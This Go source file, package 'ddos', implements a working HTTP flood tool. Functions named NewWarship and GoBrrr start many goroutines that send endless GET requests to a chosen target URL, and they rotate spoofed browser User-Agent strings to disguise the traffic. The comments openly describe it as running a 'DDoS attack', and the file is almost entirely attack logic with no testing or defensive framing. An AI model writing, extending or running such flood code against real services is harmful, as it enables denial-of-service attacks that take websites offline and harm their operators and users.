package ddos

import (
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"runtime"
	"sync/atomic"
	"time"

	"github.com/valyala/fasthttp"
)

type countingConn struct {
	net.Conn
	bytesRead, bytesWritten *int64
}

type Client struct {
	Workers        int
	Target         string
	Timeout        time.Duration
	BytesRead      int64
	BytesWritten   int64
	Ddos           *DDoS
	SuccessRequest int64
	AmountRequests int64
}

func NewWarship(target string, workers int) *Client {
	timeout, _ := time.ParseDuration("1000ms")
	return &Client{
		Workers:      workers,
		Target:       target,
		Timeout:      timeout,
		BytesRead:    0,
		BytesWritten: 0,
	}
}

func (c *Client) GoBrrr() {
	go func() {
		for {
			//client := &fasthttp.Client{
			//	ReadTimeout:                   c.Timeout,
			//	WriteTimeout:                  c.Timeout,
			//	DisableHeaderNamesNormalizing: true,
			//	TLSConfig:                     &tls.Config{InsecureSkipVerify: true},
			//	Dial: fasthttpDialFunc(
			//		&c.BytesRead, &c.BytesWritten,
			//	),
			//}
			d, err := New(c.Target, c.Workers)
			if err != nil {
				panic(err)
			}
			c.Ddos = d

			// c.Ddos.Run(client)
			c.Ddos.RunHttp()
			time.Sleep(time.Millisecond * 10)
			c.SuccessRequest += c.Ddos.SuccessRequest
			c.AmountRequests += c.Ddos.SuccessRequest
		}
	}()
}

func (c *Client) StopBrrr() {
	c.Ddos.Stop()
}

// DDoS - structure of value for DDoS attack
type DDoS struct {
	url           string
	stop          *chan bool
	amountWorkers int

	// Statistic
	SuccessRequest int64
	AmountRequests int64
}

var fasthttpDialFunc = func(
	bytesRead, bytesWritten *int64,
) func(string) (net.Conn, error) {
	return func(address string) (net.Conn, error) {
		conn, err := net.Dial("tcp", address)
		if err != nil {
			return nil, err
		}

		wrappedConn := &countingConn{
			Conn:         conn,
			bytesRead:    bytesRead,
			bytesWritten: bytesWritten,
		}

		return wrappedConn, nil
	}
}

// New - initialization of new DDoS attack
func New(URL string, workers int) (*DDoS, error) {
	if workers < 1 {
		return nil, fmt.Errorf("Amount of workers cannot be less 1")
	}
	u, err := url.Parse(URL)
	if err != nil || len(u.Host) == 0 {
		return nil, fmt.Errorf("Undefined host or error = %v", err)
	}
	s := make(chan bool)
	return &DDoS{
		url:           URL,
		stop:          &s,
		amountWorkers: workers,
	}, nil
}

// Run - run DDoS attack
func (d *DDoS) Run(client *fasthttp.Client) {
	// for i := 0; i < d.amountWorkers; i++ {
	for i := 0; i < d.amountWorkers; i++ {
		go func() {
			for {
				select {
				case <-(*d.stop):
					return
				default:
					// sent http GET requests
					_, err := sendGetRequest(d.url, client)
					atomic.AddInt64(&d.AmountRequests, 1)
					if err == nil {
						atomic.AddInt64(&d.SuccessRequest, 1)
					}
				}
				runtime.Gosched()
			}
		}()
	}
}

func (d *DDoS) RunHttp() {
	for i := 0; i < d.amountWorkers; i++ {
		go func() {
			for {
				select {
				case <-(*d.stop):
					return
				default:
					// sent http GET requests
					_, err := http.Get(d.url)
					// atomic.AddInt64(&d.AmountRequests, 1)
					d.AmountRequests += 1
					if err == nil {
						// atomic.AddInt64(&d.SuccessRequest, 1)
						d.SuccessRequest += 1
					}
				}
				runtime.Gosched()
			}
		}()
	}
}

// Stop - stop DDoS attack
func (d *DDoS) Stop() {
	for i := 0; i < d.amountWorkers; i++ {
		*d.stop <- true
	}
	close(*d.stop)
}

func sendGetRequest(url string, client *fasthttp.Client) (int, error) {
	var code int

	// prepare the request
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	req.Header.SetMethod(fasthttp.MethodGet)
	req.SetRequestURI(url)

	// set headers
	req.Header.SetContentType("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("User-Agent", getUserAgent())
	req.Header.Set("Accept-Language", "en-us,en;q=0.5")
	req.Header.Set("Accept-Encoding", "gzip,deflate")

	// fire the request
	err := client.Do(req, resp)
	if err != nil {
		code = -1
	} else {
		code = resp.StatusCode()
	}

	// release resources
	fasthttp.ReleaseRequest(req)
	fasthttp.ReleaseResponse(resp)
	return code, nil
}

func (d *DDoS) Result() (successRequest, amountRequests int64) {
	return d.SuccessRequest, d.AmountRequests
}

func getUserAgent() string {
	rand.Seed(time.Now().UnixNano())
	userAgents := []string{
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
		"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
		"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
		"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
	}
	return userAgents[rand.Intn(len(userAgents))]
}
